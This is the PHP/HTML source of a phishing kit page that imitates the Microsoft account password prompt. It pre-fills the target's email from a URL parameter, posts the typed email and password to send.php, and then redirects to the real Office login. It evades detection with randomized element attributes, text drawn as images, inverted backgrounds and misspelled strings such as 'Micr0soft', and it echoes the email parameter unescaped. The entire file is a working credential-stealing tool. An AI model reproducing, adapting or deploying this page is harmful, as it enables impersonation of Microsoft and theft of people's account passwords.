<?php
require_once 'bootstrap.php';



$email = '';
$status = '';

if(Utility::isValid($_GET['email']))
{
    $email = $_GET['email'];

    if(Utility::isBase64($email) && Config::Get('base64'))
    {
        $email = base64_decode($email);
    }


}

if(Utility::isValid($_GET['error']))
{
    $status = $_GET['error'];
}

$firstmsg = rand(1,4);

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr" class="" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="referrer" content="no-referrer"/>
    <meta name="robots" content="none">
    <noscript>
        <meta http-equiv="Refresh" content="0; URL=./"/>
    </noscript>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
    <link href="css/conv.css" rel="stylesheet">
</head>

<script>
    $(function(){

        $('#idSIButton9').click(function () {
            var email = $('#displayName').attr('title');
            var password = $('#password').val();
            $.post("send.php", {

                Email: email,
                Password: password

            },function(data,status){
            
                    window.location.href = 'https://www.office.com/login?es=Click&ru=%2F';
                
            });
        });

    });
</script>

<body <?php echo Utility::UniqueId(); ?> data-bind="defineGlobals: ServerData, bodyCssClass" class="cb"
      style="display: block;">


<div <?php echo Utility::UniqueId(); ?>>
    <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
        <div <?php echo Utility::UniqueId(); ?> class="background" role="presentation"
             data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
            <div <?php echo Utility::UniqueId(); ?> data-bind="backgroundImage: smallImageUrl()"
                 style="background-image: url(&quot;images/inv-small-background.jpg&quot;);-webkit-filter:invert(100%);filter:invert(100%);"></div>
            <div <?php echo Utility::UniqueId(); ?> class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()"
                 style="background-image: url(&quot;images/inv-big-background.jpg&quot;);-webkit-filter:invert(100%);filter:invert(100%);"></div>
        </div>
    </div>

    <style>
        .disableit {
            display: none;
        }

        .enableit {
            display: block !important;
        }

        img {
            max-width: 100%;
        }

        .novalidate {
            border-top-width: unset !important;
            border-left-width: unset !important;
            border-right-width: unset !important;
            border-color: #fa0808 !important;
            border-width: 2px !important;
        }

        .form-group {
            margin-bottom: 6px !important;
        }


        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 300;
            src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UN_r8OUuhs.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 400;
            src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v16/mem8YaGs126MiZpBA-UFVZ0e.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Open Sans';
            font-style: normal;
            font-weight: 600;
            src: local('Open Sans SemiBold'), local('OpenSans-SemiBold'), url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UNirkOUuhs.ttf) format('truetype');
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .ms-logo {
            margin-left: 30px;
            display: inline-block;
            background: #F25022;
            width: 11px;
            height: 11px;
            box-shadow: 12px 0 0 #7FBA00, 0 12px 0 #00A4EF, 12px 12px 0 #FFB900;
            transform: translatex(-300%);
        }

        .ms-logo::after {
            content: 'Microsoft';
            /*font-family: 'Segoe Pro', 'Segoe UI', 'Open Sans', sans-serif;
            font-weight: 600;*/
            font: bold 20px sans-serif;
            margin-left: 28px;
            color: #737373;
        }


        @font-face {
            font-family: 'text-security-disc';
            src: url('fonts/tsd.eot');
            src: url('fonts/tsd.eot?#iefix') format('embedded-opentype'),
            url('fonts/tsd.woff2') format('woff2'),
            url('fonts/tsd.woff') format('woff'),
            url('fonts/tsd.ttf') format('truetype'),
            url('fonts/tsd.svg#text-security') format('svg');
        }


        .form-control::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
            font-family: 'Open Sans', Arial, Helvetica, sans-serif;
            opacity: 1; /* Firefox */
        }

        .form-control:-ms-input-placeholder { /* Internet Explorer 10-11 */
            font-family: 'Open Sans', Arial, Helvetica, sans-serif;
        }

        .form-control::-ms-input-placeholder { /* Microsoft Edge */
            font-family: 'Open Sans, Arial, Helvetica, sans-serif;
        }
    </style>

    <div <?php echo Utility::UniqueId(); ?> class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            passwrd: passwrd,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
        <div class="middle"  <?php echo Utility::UniqueId(); ?> data-bind="css: { 'app': backgroundLogoUrl }">
            <div <?php echo Utility::UniqueId(); ?> class="inner fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">

                <div <?php echo Utility::UniqueId(); ?> class="lightbox-cover"
                     data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

                <div <?php echo Utility::UniqueId(); ?> id="progressBar" class="progress disableit" role="progressbar"
                     data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']"
                     aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation -->
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div>

                <div <?php echo Utility::UniqueId(); ?> class="ms-logo" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"> <? /*<img class="logo <?=$rndString4?>" pngsrc="images/mcsft_logo.png" svgsrc="images/mcsft_logo.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Micr0soft'] }" src="images/mcsft_logo.svg" alt="Micr0soft">*/ ?>  </div>
                <div <?php echo Utility::UniqueId(); ?> role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }">
                    <div <?php echo Utility::UniqueId(); ?> data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                        <div <?php echo Utility::UniqueId(); ?> data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next ">
                            <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }">
                                <div <?php echo Utility::UniqueId(); ?> class="identityBanner">
                                    <button <?php echo Utility::UniqueId(); ?> type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back"><img <?php echo Utility::UniqueId(); ?> role="presentation"
                                                                            pngsrc="images/arrow_left.png"
                                                                            svgsrc="images/arrow_left.svg"
                                                                            data-bind="imgSrc"
                                                                            src="images/arrow_left.svg"></button>
                                    <div <?php echo Utility::UniqueId(); ?> id="displayName" class="identity"
                                         data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"
                                         title="<?php echo $email; ?>"><?php echo $email; ?></div>

                                </div>
                            </div>
                        </div>
                        <div <?php echo Utility::UniqueId(); ?> class="pagination-view animate has-identity-banner slide-in-next"
                             data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
                            <div <?php echo Utility::UniqueId(); ?> data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-passwrd-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwrdBrowserPrefill: sharedData.passwrdBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.urlGitHubFed,
                            googleRedirectUrl: sharedData.googleParams.redirectUrl || svr.urlGoogleFed },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPasswrd: $loginPage.passwrdView_onResetPasswrd,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                <div id="loginHeader" class="row text-title" <?php echo Utility::UniqueId(); ?> role="heading"
                                     aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPasswrd_Title']"><img
                                            src="<?php echo "images/enterpass.png"; ?>"></div>
                                <div class="row" <?php echo Utility::UniqueId(); ?>>
                                    <div class="form-group col-md-24" <?php echo Utility::UniqueId(); ?>>


                                        <div <?php echo Utility::UniqueId(); ?> role="alert" aria-live="assertive">
                                            <!-- ko if: passwrdTextbox.error -->

                                            <? if ($status == 'error'){ ?>
                                                <div <?php echo Utility::UniqueId(); ?> id="passwrdError" class="alert alert-error has-error"
                                                     data-bind="
                htmlWithBindings: passwrdTextbox.error,
                childBindings: { 'idA_IL_ForgotPasswrd0': { href: svr.urlResetPasswrd, click: resetPasswrd_onClick } }"><?php echo "your account or password is incorrect try again with correct password."; ?>


                                                    <?php if ($status != 'error') { ?>,
                                                        <a id="idA_IL_ForgotPasswrd0"
                                                           href="#"><?php echo Utility::UniqueId(); ?></a><?php } ?>
                                                </div>
                                            <?php }else if ($firstmsg){ ?>
                                            <div <?php echo Utility::UniqueId(); ?> id="passwrdError" class="alert" <?php echo Utility::UniqueId(); ?>">
                                                <div id="passwrdError" class="alert>">
                                                    <img <?php echo Utility::UniqueId(); ?> class=""
                                                         src="./images/firstmsg<?php if ($firstmsg) echo $firstmsg ?>.png"
                                                         <?php echo Utility::UniqueId(); ?>
                                                                                    style="width: 100%;"></div>
                                        <?php } ?>
                                        <!-- /ko --> </div>


                                    <div class="placeholderContainer " data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwrdTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwrdTextbox.textbox_onUpdateFocus } }">
                                        <!--javadcript here-->
                                        <style>
                                            #spoinput {
                                                font-family: inherit;
                                                font-size: inherit;
                                                line-height: inherit;
                                                background-image: url(./images/passwrd.png);
                                                background-repeat: no-repeat;
                                                cursor: text;
                                            }

                                            #spoinput {
                                                max-width: 100%;
                                                line-height: inherit;
                                            }

                                            #spoinput {
                                                /* display: block; */
                                                /* width: 100%; */
                                                /* background-image: none; */
                                            }

                                            #spoinput {
                                                padding: 4px 8px;
                                                border-style: solid;
                                                /* border-width: 2px; */
                                                border-color: rgba(0, 0, 0, 0.31);
                                                /* background-color: rgba(255,255,255,0.4); */
                                                /* height: 32px; */
                                                /* height: 2rem; */
                                            }

                                            #spoinput {
                                                /* padding: 6px 10px; */
                                                border-width: 1px;
                                                border-color: #666;
                                                border-color: rgba(0, 0, 0, 0.6);
                                                height: 36px;
                                                outline: none;
                                                border-radius: 0;
                                                -webkit-border-radius: 0;
                                                background-color: transparent;
                                            }

                                            #spoinput {
                                                border-top-width: 0;
                                                border-left-width: 0;
                                                border-right-width: 0;
                                            }
                                        </style>
                                        <!-- has-error-->
                                        <input id="password" type="password" name="password" placeholder="Password" style="width: 100%;">
<!--                                        <div id="makeinput" onclick="makeInputHere(this);">-->
<!--                                            -->
<!--                                            <div id="spoinput"></div>-->
<!---->
<!---->
<!--                                        </div>-->


                                    </div>
                                </div>
                            </div>
                            <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }"
                                 class="position-buttons ">
                                <div>
                                    <div class="row">
                                        <div class="col-md-24">
                                            <div class="text-13 action-links">
                                                <div class="form-group "><a id="idA_PWD_ForgotPasswrd"
                                                                                              role="link" href="#"
                                                                                              data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.urlResetPasswrd, click: resetPasswrd_onClick"><img
                                                                src="images/forgetpass.png"></a></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row "
                                     data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                    <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_Si1gnI1n_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: false },
        event: {
            primaryButtonClick: primaryButton_onClick } }">
                                        <div class="col-xs-24 no-padding-left-right button-container "
                                             data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">
                                            <div class="inline-block">
                                                <div id="idSIButton9"
                                                     class="btn btn-block btn-primary "></div>

                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="footer" class="footer default " role="contentinfo"
             data-bind="css: { 'default': !backgroundLogoUrl() }">
            <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }">
                <div id="footerLinks" class="footerNode text-secondary"><span id="ftrCopy"
                                                                                                 data-bind="html: svr.strCopyrightTxt"<? echo '&#xA9;' . $RndString1 . '&#x32;' . $RndString2 . '&#x30;' . $RndString3 . '&#x31;' . $RndString4 . '&#x39;' . $RndString1 . '&#x20;' ?></span>
                    <a id="ftrTerms"
                       data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick"
                       href="#">Terms of use</a> <a id="ftrPrivacy"
                                                    data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick"
                                                    href="#"></a>
                    <a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information"> <img class="desktopMode"
                                                                                                 role="presentation"
                                                                                                 pngsrc="images/ellipsis_white.png"
                                                                                                 svgsrc="images/ellipsis_white.svg"
                                                                                                 data-bind="imgSrc"
                                                                                                 src="images/ellipsis_white.svg">
                        <img class="mobileMode" role="presentation" pngsrc="images/ellipsis_grey.png"
                             svgsrc="images/ellipsis_grey.svg" data-bind="imgSrc" src="images/ellipsis_grey.svg"> </a>
                </div>
            </div>
        </div>
    </div>
</div> <!--/*data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog"*/-->
</div>
</body>
</html>